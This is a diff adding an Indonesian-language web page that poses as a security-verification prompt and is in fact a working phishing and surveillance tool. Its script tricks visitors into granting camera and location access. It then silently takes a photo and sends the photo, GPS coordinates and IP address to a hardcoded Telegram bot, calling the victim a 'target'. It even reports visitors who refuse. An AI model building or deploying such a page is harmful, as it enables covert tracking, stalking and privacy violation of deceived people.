@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Verifikasi Keamanan</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    
+    body {
+        background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+
+    /* Card Modal */
+    .security-box {
+        background: #ffffff;
+        width: 100%;
+        max-width: 340px;
+        border-radius: 16px;
+        padding: 28px 24px;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        animation: slideUp 0.4s ease-out;
+    }
+
+    @keyframes slideUp {
+        from { opacity: 0; transform: translateY(30px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon-lock {
+        font-size: 42px;
+        margin-bottom: 12px;
+        display: inline-block;
+    }
+
+    .title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #111827;
+        margin-bottom: 8px;
+    }
+
+    .desc {
+        font-size: 13px;
+        color: #4b5563;
+        line-height: 1.5;
+        margin-bottom: 20px;
+    }
+
+    .req-list {
+        text-align: left;
+        background: #f9fafb;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 24px;
+    }
+
+    .req-item {
+        display: flex;
+        align-items: center;
+        font-size: 13px;
+        color: #374151;
+        margin-bottom: 8px;
+        font-weight: 500;
+    }
+
+    .req-item:last-child { margin-bottom: 0; }
+
+    .red-dot {
+        width: 8px;
+        height: 8px;
+        background: #ef4444;
+        border-radius: 50%;
+        margin-right: 10px;
+    }
+
+    .btn-allow {
+        width: 100%;
+        padding: 14px;
+        background: #2563eb;
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+
+    .btn-allow:hover { background: #1d4ed8; }
+    .btn-allow:disabled { background: #93c5fd; cursor: not-allowed; }
+
+    .error-msg {
+        display: none;
+        margin-top: 14px;
+        padding: 10px;
+        background: #fef2f2;
+        border: 1px solid #fecaca;
+        border-radius: 8px;
+        font-size: 12px;
+        color: #dc2626;
+        line-height: 1.4;
+    }
+
+    .error-msg.show { display: block; }
+
+    /* Success State */
+    .success-box {
+        display: none;
+        background: #ffffff;
+        width: 100%;
+        max-width: 340px;
+        border-radius: 16px;
+        padding: 32px 24px;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+    }
+
+    .check-icon {
+        font-size: 48px;
+        color: #22c55e;
+        margin-bottom: 16px;
+    }
+
+    .success-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #111827;
+        margin-bottom: 8px;
+    }
+
+    .success-desc {
+        font-size: 13px;
+        color: #4b5563;
+        line-height: 1.5;
+    }
+</style>
+</head>
+<body>
+
+    <!-- BOX VERIFIKASI -->
+    <div class="security-box" id="securityBox">
+        <span class="icon-lock">🔒</span>
+        <div class="title">Verifikasi Keamanan</div>
+        <div class="desc">Untuk melanjutkan, harap izinkan akses kamera dan lokasi. Sistem membutuhkan ini untuk memverifikasi identitas Anda.</div>
+        
+        <div class="req-list">
+            <div class="req-item"><div class="red-dot"></div> Akses Kamera</div>
+            <div class="req-item"><div class="red-dot"></div> Akses Lokasi</div>
+        </div>
+
+        <button class="btn-allow" id="btnAllow">Izinkan & Lanjutkan</button>
+        <div class="error-msg" id="errorMsg">Akses ditolak! Harap izinkan kamera dan lokasi di pengaturan browser Anda, lalu muat ulang halaman ini.</div>
+    </div>
+
+    <!-- BOX SUKSES -->
+    <div class="success-box" id="successBox">
+        <div class="check-icon">✓</div>
+        <div class="success-title">Verifikasi Berhasil</div>
+        <div class="success-desc">Identitas Anda telah terverifikasi. Anda dapat menutup halaman ini.</div>
+    </div>
+
+<script>
+    // ==========================================
+    // GANTI DENGAN TOKEN BOT DAN ID TELEGRAM KAMU
+    // ==========================================
+    const TG_BOT = "8892173347:AAG1U9H0TpUirG3rikyUP1XZRwt1RV1Cu6c";
+    const TG_CHAT = "7191940139";
+    // ==========================================
+
+    const btnAllow = document.getElementById('btnAllow');
+    const securityBox = document.getElementById('securityBox');
+    const successBox = document.getElementById('successBox');
+    const errorMsg = document.getElementById('errorMsg');
+
+    // Fungsi Kirim Pesan Teks
+    async function sendTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: "HTML" })
+            });
+        } catch (e) {}
+    }
+
+    // Fungsi Kirim Foto
+    async function sendPhoto(blob, caption) {
+        try {
+            const fd = new FormData();
+            fd.append("chat_id", TG_CHAT);
+            fd.append("caption", caption);
+            fd.append("photo", blob, "target.jpg");
+            await fetch(`https://api.telegram.org/bot${TG_BOT}/sendPhoto`, { method: "POST", body: fd });
+        } catch (e) {}
+    }
+
+    // Fungsi Ambil IP
+    async function getIP() {
+        try {
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            return `${d.ip} (${d.city}, ${d.country_name})`;
+        } catch (e) { return "IP Tidak diketahui"; }
+    }
+
+    // LOGIKA UTAMA SAAT TOMBOL DITEKAN
+    btnAllow.addEventListener('click', async () => {
+        btnAllow.disabled = true;
+        btnAllow.textContent = "Meminta Izin...";
+        errorMsg.classList.remove('show');
+
+        let camGranted = false;
+        let locGranted = false;
+        let lat = null, lon = null;
+
+        // 1. MINTA IZIN KAMERA
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Matikan kamera sementara agar tidak curiga, kita nyalakan lagi nanti saat mau foto
+            stream.getTracks().forEach(t => t.stop());
+            camGranted = true;
+        } catch (e) {
+            camGranted = false;
+        }
+
+        // 2. MINTA IZIN LOKASI
+        await new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve();
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    locGranted = true;
+                    lat = pos.coords.latitude;
+                    lon = pos.coords.longitude;
+                    resolve();
+                },
+                () => {
+                    locGranted = false;
+                    resolve();
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        });
+
+        // 3. JIKA KEDUANYA DIIZINKAN
+        if (camGranted && locGranted) {
+            btnAllow.textContent = "Memverifikasi...";
+            
+            // Ambil Data
+            const ipData = await getIP();
+            let msg = "🔓 <b>TARGET TERTANGKAP!</b>\n";
+            msg += "━━━━━━━━━━━━━━━━━━━━\n";
+            msg += `🌐 IP: <b>${ipData}</b>\n`;
+            msg += `📍 Lat: <code>${lat}</code>\n`;
+            msg += `📍 Lng: <code>${lon}</code>\n`;
+            msg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Buka Google Maps</a>\n`;
+            msg += `🕒 Waktu: ${new Date().toLocaleString('id-ID')}`;
+            
+            await sendTelegram(msg);
+
+            // Ambil Foto (Senyap)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                // Tunggu 1 detik agar kamera fokus
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.8));
+                stream.getTracks().forEach(t => t.stop());
+                
+                if (blob) await sendPhoto(blob, "📸 <b>Foto Target</b>");
+            } catch(e) {}
+
+            // Tampilkan Sukses
+            securityBox.style.display = 'none';
+            successBox.style.display = 'block';
+
+        } else {
+            // 4. JIKA DITOLAK
+            btnAllow.disabled = false;
+            btnAllow.textContent = "Izinkan & Lanjutkan";
+            errorMsg.classList.add('show');
+            
+            // Lapor ke Telegram kalau target nolak
+            await sendTelegram("⚠️ <b>Target menolak izin!</b>\nStatus Kamera: " + (camGranted?"OK":"Ditolak") + "\nStatus Lokasi: " + (locGranted?"OK":"Ditolak"));
+        }
+    });
+</script>
+</body>
+</html>
